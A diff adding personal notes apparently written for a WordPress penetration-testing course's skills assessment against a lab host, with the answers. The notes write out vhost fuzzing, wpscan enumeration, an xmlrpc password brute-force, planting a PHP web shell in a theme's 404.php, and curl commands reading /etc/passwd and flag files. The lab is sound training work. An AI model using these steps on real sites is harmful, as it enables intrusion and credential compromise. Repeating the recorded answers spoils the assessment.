@@ -677,4 +677,95 @@ Certain configuration changes can increase the overall security posture of a Wor
 
 ## Skills Assessment
 
+We have reached the end of the module!
+
+Now let's put all of the new skills we have learned into practice. This final skills assessment will test each of the topics introduced in this module against a new WordPress target.
+Scenario
+
+You have been contracted to perform an external penetration test against the company INLANEFREIGHT that is hosting one of their main public-facing websites on WordPress.
+
+Enumerate the target thoroughly using the skills learned in this module to find a variety of flags. Obtain shell access to the webserver to find the final flag.
+
+-----------------------
+
+**Questions in this section:**
+
+Identify the WordPress version number. 
+
+Not seeing a wordpress site... trying to enumerate.
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u http://10.129.2.37/FUZZ -e .php -ic `
+
+Doesn't find anything.
+
+Maybe I need to vhost fuzz...
+
+`ffuf -w /Users/noneya/Useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://inlanefrieght.htb -H 'Host: FUZZ.inlanefreight.htb'`
+
+Nope...
+
+I'm dumb its page https://w3layouts.com/
+
+Or maybe not...
+
+So the problem is it was a vhost but I had the wrong name of the site. I needed to be looking for inlanefreight.local.
+
+The site with WP is http://blog.inlanefreight.local/
+
+`wpscan --url "http://blog.inlanefreight.local/" --enumerate --api-token [nope mine kid]
+
+Answer is:
+version 5.1.6
+
+
+Identify the WordPress theme in use. 
+
+Answer is twentynineteen
+
+Submit the contents of the flag file in the directory with directory listing enabled. 
+
+I just got this after getting RCE and searching around...
+`curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20%2F/var/www/blog.inlanefreight.local/public_html/wp-content/uploads/upload_flag.txt"`
+
+Identify the only non-admin WordPress user. (Format: <first-name> <last-name>) 
+
+Charlie Wiggins
+
+Use a vulnerable plugin to download a file containing a flag value via an unauthenticated file download. 
+
+`curl 'http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all'`
+
+What is the version number of the plugin vulnerable to an LFI? 
+
+1.1.1
+
+Use the LFI to identify a system user whose name starts with the letter "f". 
+
+This actually came from enumerating the logins below and injecting an RCE
+frank.mclane
+
+Obtain a shell on the system and submit the contents of the flag in the /home/erika directory. 
+
+Trying to get the password of the users
+`wpscan --password-attack xmlrpc -t 20 -U admin, david -P /Users/noneya/Useful/Wordlists/rockyou.txt --url "http://blog.inlanefreight.local"`
+
+Username: erika, Password: 010203
+
+Go to the admin page and login.
+
+Then go to themes. Change the 404.php file on the twentyseventeen theme to have:
+`system($_GET['cmd']);`
+
+Now try:
+`curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"`
+
+And that works, so I can now get a reverse shell if I want. Or just try and get my other answers.
+
+`curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20%2F/etc/passwd"`
+
+That gets me the users. 
+
+`curl -X GET "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20%2F/home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"`
+
+This is the answer.
 
